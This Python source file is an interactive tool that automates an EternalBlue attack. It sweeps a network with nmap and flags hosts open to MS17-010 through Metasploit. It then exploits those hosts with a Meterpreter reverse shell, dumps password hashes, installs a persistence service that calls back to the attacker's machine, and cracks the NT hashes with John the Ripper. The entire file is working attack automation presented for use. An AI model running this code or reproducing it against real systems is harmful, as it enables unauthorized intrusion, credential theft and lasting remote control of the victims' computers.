import os
import subprocess
import cmd
import logging
import json
from datetime import datetime
from pathlib import Path
import time
import re

# Configuration setup
CONFIG_FILE = "config.json"
DEFAULT_CONFIG = {
    "output_dir": "exploit_output",
    "log_file": "exploit_log.log",
    "nmap_path": "nmap",
    "msfconsole_path": "msfconsole",
    "default_lport": "4445"  # Default port for persistence
}

class ExploitTool(cmd.Cmd):
    intro = "Welcome to the EternalBlue Exploit Tool. Type 'start' to begin."
    prompt = "exploit> "
    target_network = None
    local_ip = None
    extracted_hashes = []
    config = {}

    def __init__(self):
        super().__init__()
        self.setup_logging()
        self.load_or_create_config()
        self.ensure_output_dir()

    def setup_logging(self):
        """Set up logging to both file and console."""
        log_dir = Path(self.config.get("output_dir", "exploit_output"))
        log_file = log_dir / self.config.get("log_file", "exploit_log.log")
        log_dir.mkdir(exist_ok=True)

        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler(log_file),
                logging.StreamHandler()
            ]
        )
        self.logger = logging.getLogger(__name__)

    def load_or_create_config(self):
        """Load configuration from file or create new with user input."""
        config_path = Path(CONFIG_FILE)
        if config_path.exists():
            with open(config_path, "r") as f:
                self.config = json.load(f)
        else:
            self.config = DEFAULT_CONFIG.copy()
            default_lhost = input("Enter your default local IP (LHOST for payload, e.g., 192.168.1.10): ").strip()
            if not default_lhost:
                self.logger.error("[!] No default local IP provided. Using placeholder.")
                default_lhost = "192.168.1.10"
            self.config["default_lhost"] = default_lhost
            
            with open(config_path, "w") as f:
                json.dump(self.config, f, indent=4)
            self.logger.info(f"Created new config file at {CONFIG_FILE} with default LHOST: {default_lhost}")

    def ensure_output_dir(self):
        """Ensure the output directory exists with detailed logging and error handling."""
        output_dir = Path(self.config.get("output_dir", "exploit_output"))
        try:
            output_dir.mkdir(parents=True, exist_ok=True)
            self.logger.info(f"[*] Output directory ensured: {output_dir.absolute()}")
        except PermissionError as e:
            self.logger.error(f"[!] Permission denied to create directory {output_dir}: {str(e)}")
            raise
        except Exception as e:
            self.logger.error(f"[!] Failed to create output directory {output_dir}: {str(e)}")
            raise

    def is_valid_ip(self, ip):
        """Check if a string is a valid IP address, optionally stripping port."""
        ip = ip.split(':')[0]
        ip_pattern = r'^(\d{1,3}\.){3}\d{1,3}$'
        if re.match(ip_pattern, ip):
            octets = ip.split('.')
            return all(0 <= int(octet) <= 255 for octet in octets)
        return False

    def do_start(self, arg):
        """Start the script by setting the target network and local IP"""
        try:
            # Run installpackages.sh at the start
            self.logger.info("[*] Running installpackages.sh to ensure dependencies are installed...")
            try:
                result = subprocess.run(
                    ["bash", "installpackages.sh"],
                    capture_output=True,
                    text=True,
                    timeout=300
                )
                self.logger.info(f"[*] installpackages.sh output: {result.stdout}")
                if result.stderr:
                    self.logger.error(f"[!] installpackages.sh errors: {result.stderr}")
            except subprocess.TimeoutExpired:
                self.logger.error("[!] installpackages.sh timed out.")
            except FileNotFoundError:
                self.logger.error("[!] installpackages.sh not found in the current directory.")
            except Exception as e:
                self.logger.error(f"[!] Error running installpackages.sh: {str(e)}")

            self.target_network = input("Enter the target network IP range (e.g., 192.168.1.0/24): ").strip()
            self.local_ip = input(f"Enter your local IP (LHOST for payload) [default: {self.config.get('default_lhost', '192.168.1.10')}]: ").strip() or self.config.get('default_lhost')

            if not self.target_network:
                self.logger.error("[!] Invalid input. Please provide a valid target network IP range.")
                return

            self.logger.info(f"[*] Scanning network: {self.target_network}")
            live_hosts = self.scan_network(self.target_network)

            if not live_hosts:
                self.logger.warning("[!] No live hosts found. Exiting.")
                return

            self.logger.info(f"[*] Found {len(live_hosts)} live hosts")
            self.save_live_hosts_to_file(live_hosts)
            
            self.logger.debug(f"Starting EternalBlue scan with live hosts: {live_hosts}")
            time.sleep(1)

            vulnerable_hosts = self.scan_eternalblue_with_msf()

            if not vulnerable_hosts:
                self.logger.warning("[!] No vulnerable hosts found. Exiting.")
                return

            for host in vulnerable_hosts:
                self.logger.info(f"[*] Exploiting {host}...")
                self.exploit_eternalblue(host)

            # Add hash cracking prompt here, after exploitation is complete
            self.logger.info("[*] Exploitation process completed.")
            crack_hashes = input("\nWould you like to crack the extracted hashes using John the Ripper? (yes/no): ").strip().lower()
            if crack_hashes == 'yes':
                hash_file = "clean_hashes.txt"
                if not os.path.exists(hash_file):
                    self.logger.error(f"[!] Error: {hash_file} not found. Make sure hashes were extracted successfully.")
                    print(f"[!] Error: {hash_file} not found.")
                else:
                    self.logger.info("[*] Starting John the Ripper to crack NT hashes with 2-minute timeout...")
                    print("[*] Cracking hashes (timeout after 2 minutes)...")
                    try:
                        # Start John process
                        process = subprocess.Popen(
                            ["john", "--format=NT", hash_file],
                            stdout=subprocess.PIPE,
                            stderr=subprocess.PIPE,
                            text=True
                        )

                        # Wait for 2 minutes (120 seconds) or until process completes
                        try:
                            stdout, stderr = process.communicate(timeout=120)
                            # Parse and display only cracked passwords
                            cracked = []
                            for line in stdout.split("\n"):
                                if "(" in line and ")" in line and len(line.split()) >= 1:
                                    password = line.split()[0].strip()
                                    username = line[line.find("(")+1:line.find(")")]
                                    cracked.append(f"{username}: {password}")
                            if cracked:
                                print("[*] Cracked passwords:")
                                for entry in cracked:
                                    print(entry)
                            else:
                                print("[*] No passwords cracked.")
                        except subprocess.TimeoutExpired:
                            self.logger.warning("[!] John took longer than 2 minutes. Terminating and showing partial results...")
                            print("[!] Timeout after 2 minutes. Showing cracked passwords so far...")
                            process.kill()  # Terminate the process
                            stdout, stderr = process.communicate()  # Get any output up to this point
                            # Parse partial output for cracked passwords
                            cracked = []
                            for line in stdout.split("\n"):
                                if "(" in line and ")" in line and len(line.split()) >= 1:
                                    password = line.split()[0].strip()
                                    username = line[line.find("(")+1:line.find(")")]
                                    cracked.append(f"{username}: {password}")
                            if cracked:
                                print("[*] Cracked passwords so far:")
                                for entry in cracked:
                                    print(entry)
                            else:
                                print("[*] No passwords cracked within 2 minutes.")
                        except Exception as e:
                            self.logger.error(f"[!] Error during John execution: {str(e)}")
                            print(f"[!] Error: {str(e)}")
                    except FileNotFoundError:
                        self.logger.error("[!] Error: John the Ripper not found. Please ensure it's installed and in your PATH.")
                        print("[!] Error: John the Ripper not found.")
                    except Exception as e:
                        self.logger.error(f"[!] Error running John: {str(e)}")
                        print(f"[!] Error: {str(e)}")
            else:
                self.logger.info("[*] Continuing without cracking hashes.")
                print("[*] Continuing without cracking hashes.")

        except Exception as e:
            self.logger.error(f"[!] An error occurred: {str(e)}")
            return

    def do_dump_hashes(self, dir_path):
        """Dump extracted hashes into a file in the provided directory"""
        try:
            if not dir_path:
                self.logger.error("[!] Usage: dump_hashes <directory>")
                return

            output_dir = Path(self.config["output_dir"]) / dir_path
            output_dir.mkdir(parents=True, exist_ok=True)
            file_path = output_dir / "extracted_hashes.txt"

            with open(file_path, "w") as f:
                for hash_entry in self.extracted_hashes:
                    f.write(hash_entry + "\n")

            self.logger.info(f"[*] Hashes dumped to {file_path}")

        except Exception as e:
            self.logger.error(f"[!] Failed to dump hashes: {str(e)}")

    def do_exit(self, arg):
        """Exit the script"""
        self.logger.info("[*] Exiting...")
        return True

    def scan_network(self, network_ip):
        """Scan the network and return a list of live hosts"""
        try:
            result = subprocess.run(
                [self.config['nmap_path'], '-sn', network_ip],
                capture_output=True,
                text=True,
                timeout=30
            )
            hosts = []

            for line in result.stdout.split("\n"):
                if "Nmap scan report for" in line:
                    host_ip = line.split()[-1].strip("()")
                    if host_ip and host_ip != self.local_ip:
                        hosts.append(host_ip)

            self.logger.info(f"[*] Discovered live hosts: {hosts}")
            return hosts

        except subprocess.CalledProcessError as e:
            self.logger.error(f"[!] Nmap scan failed: {str(e)}")
            return []
        except subprocess.TimeoutExpired as e:
            self.logger.error(f"[!] Nmap scan timed out: {str(e)}")
            return []
        except Exception as e:
            self.logger.error(f"[!] Unexpected error during network scan: {str(e)}")
            return []

    def save_live_hosts_to_file(self, live_hosts):
        """Save live hosts to a file for Metasploit usage, excluding the local IP"""
        try:
            output_dir = Path(self.config["output_dir"])
            self.ensure_output_dir()
            live_hosts_file = output_dir / "live_hosts.txt"

            if not live_hosts:
                self.logger.warning("[!] No live hosts to save.")
                return

            self.logger.debug(f"Attempting to save live hosts to {live_hosts_file.absolute()}")
            with open(live_hosts_file, "w") as file:
                for host in live_hosts:
                    file.write(host + "\n")

            self.logger.info(f"[*] Live hosts saved to {live_hosts_file.absolute()}")

        except Exception as e:
            self.logger.error(f"[!] Failed to save live hosts: {str(e)}")
            raise

    def scan_eternalblue_with_msf(self):
        """Check for EternalBlue vulnerability using Metasploit with timeout and better error handling"""
        try:
            vulnerable_hosts = []
            output_dir = Path(self.config["output_dir"])
            self.ensure_output_dir()
            live_hosts_file = output_dir / "live_hosts.txt"

            if not live_hosts_file.exists():
                self.logger.error(f"[!] Live hosts file {live_hosts_file.absolute()} not found!")
                return []

            self.logger.debug(f"Checking file contents: {live_hosts_file.read_text() if live_hosts_file.exists() else 'File empty'}")

            msf_command = [
                self.config['msfconsole_path'], '-q', '-x',
                f"use auxiliary/scanner/smb/smb_ms17_010; set RHOSTS file:{live_hosts_file.absolute()}; run; exit"
            ]
            self.logger.debug(f"Running Metasploit command: {' '.join(msf_command)}")

            result = subprocess.run(
                msf_command,
                capture_output=True,
                text=True,
                timeout=300,
                cwd=str(output_dir)  # Set working directory to output_dir
            )

            self.logger.debug(f"Metasploit output: {result.stdout}")
            if result.stderr:
                self.logger.error(f"Metasploit error output: {result.stderr}")

            for line in result.stdout.split("\n"):
                if "VULNERABLE" in line:
                    parts = line.split()
                    for part in parts:
                        if self.is_valid_ip(part):
                            host = part.split(':')[0]
                            vulnerable_hosts.append(host)
                            self.logger.info(f"[*] Found vulnerable target: {host}")
                            break
                    else:
                        self.logger.warning(f"[!] Could not parse vulnerable host from line: {line}")

            return vulnerable_hosts

        except subprocess.CalledProcessError as e:
            self.logger.error(f"[!] Metasploit scan failed: {str(e)}")
            if e.stderr:
                self.logger.error(f"Metasploit stderr: {e.stderr}")
            return []
        except subprocess.TimeoutExpired as e:
            self.logger.error(f"[!] Metasploit scan timed out: {str(e)}")
            if e.stdout:
                self.logger.debug(f"Partial output before timeout: {e.stdout}")
            return []
        except Exception as e:
            self.logger.error(f"[!] Unexpected error during vulnerability scan: {str(e)}")
            return []

    def exploit_eternalblue(self, target_ip):
        """Exploit EternalBlue, dump hashes, establish persistence, and process hashes"""
        try:
            # Step 1: Initial exploit and hashdump
            exploit_command = [
                self.config['msfconsole_path'], '-q', '-x',
                f"use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS {target_ip}; set LHOST {self.local_ip}; "
                f"set PAYLOAD windows/x64/meterpreter/reverse_tcp; exploit -z; "
                f"spool ~/hashes; sleep 5; sessions -i 1 -C hashdump; spool off; exit -y"
            ]
            self.logger.debug(f"Running initial exploit command for {target_ip}: {' '.join(exploit_command)}")
            self.logger.info(f"[*] Attempting to exploit {target_ip} and extract hashes...")

            self.logger.debug(f"Launching subprocess for initial exploit on {target_ip}")
            result = subprocess.run(
                exploit_command,
                capture_output=True,
                text=True,
                timeout=300
            )
            self.logger.debug(f"Initial exploit subprocess completed for {target_ip}")

            stdout = result.stdout
            stderr = result.stderr
            self.logger.debug(f"Exploit output: {stdout}")
            if stderr:
                self.logger.error(f"Exploit error output for {target_ip}: {stderr}")

            self.logger.info("[*] Extracting hashes...")
            hashes_found = False
            for line in stdout.split("\n"):
                if "Administrator" in line or "Admin" in line or ":$" in line:
                    self.extracted_hashes.append(line.strip())
                    self.logger.info(f"Found hash: {line.strip()}")
                    hashes_found = True

            if not hashes_found:
                self.logger.warning(f"[!] No hashes found for {target_ip} in script output")
            else:
                self.logger.info(f"[*] Hashes also saved to hashes")

            # Extract session ID
            session_id = None
            for line in stdout.split("\n"):
                if "Meterpreter session" in line and "opened" in line:
                    match = re.search(r'Meterpreter session (\d+) opened', line)
                    if match:
                        session_id = match.group(1)
                        self.logger.info(f"[*] Meterpreter session {session_id} opened for {target_ip}")
                        break

            if not session_id:
                self.logger.warning(f"[!] No Meterpreter session created for {target_ip}")
            else:
                # Step 2: Establish persistence with the correct session ID
                persistence_command = [
                    self.config['msfconsole_path'], '-q', '-x',
                    f"use exploit/windows/local/persistence_service; set SESSION {session_id}; set LHOST {self.local_ip}; "
                    f"set LPORT {self.config.get('default_lport', '4445')}; set PAYLOAD windows/meterpreter/reverse_tcp; "
                    f"run; exit -y"
                ]
                self.logger.debug(f"Running persistence command for {target_ip}: {' '.join(persistence_command)}")
                self.logger.info(f"[*] Establishing persistent session on {target_ip} with session {session_id}...")

                self.logger.debug(f"Launching subprocess for persistence on {target_ip}")
                persistence_result = subprocess.run(
                    persistence_command,
                    capture_output=True,
                    text=True,
                    timeout=300
                )
                self.logger.debug(f"Persistence subprocess completed for {target_ip}")

                self.logger.debug(f"Persistence output: {persistence_result.stdout}")
                if persistence_result.stderr:
                    self.logger.error(f"Persistence error output for {target_ip}: {persistence_result.stderr}")

                if "Persistence service installed" in persistence_result.stdout:
                    self.logger.info(f"[*] Persistence successfully established on {target_ip}")
                else:
                    self.logger.warning(f"[!] Failed to establish persistence on {target_ip}")

                # Step 3: Set up the handler in the background
                handler_command = [
                    self.config['msfconsole_path'], '-q', '-x',
                    f"use exploit/multi/handler; set LHOST {self.local_ip}; "
                    f"set LPORT {self.config.get('default_lport', '4445')}; set PAYLOAD windows/meterpreter/reverse_tcp; "
                    f"run -j; exit -y"
                ]
                self.logger.debug(f"Running handler command for {target_ip}: {' '.join(handler_command)}")
                self.logger.info(f"[*] Setting up handler for persistent session on {target_ip}...")

                self.logger.debug(f"Launching subprocess for handler on {target_ip}")
                subprocess.Popen(
                    handler_command,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True
                )
                time.sleep(5)  # Give it time to start
                self.logger.info(f"[*] Handler started for {target_ip} on LPORT {self.config.get('default_lport', '4445')}")

            # Step 4: Process hashes with extract.py
            try:
                self.logger.info(f"[*] Calling extract.py to process hashes")
                subprocess.run(["python", "extract.py"], check=True)
                self.logger.info(f"[*] extract.py executed successfully")
            except subprocess.CalledProcessError as e:
                self.logger.error(f"[!] Failed to run extract.py: {str(e)}")
            except Exception as e:
                self.logger.error(f"[!] Unexpected error while running extract.py: {str(e)}")

            self.logger.info(f"[*] Exploitation and persistence setup for {target_ip} completed")

        except subprocess.TimeoutExpired as e:
            self.logger.error(f"[!] Exploitation timed out for {target_ip}: {str(e)}")
            if e.stdout:
                self.logger.debug(f"Partial output before timeout for {target_ip}: {e.stdout}")
        except Exception as e:
            self.logger.error(f"[!] Unexpected error during exploitation of {target_ip}: {str(e)}")

if __name__ == "__main__":
    ExploitTool().cmdloop()
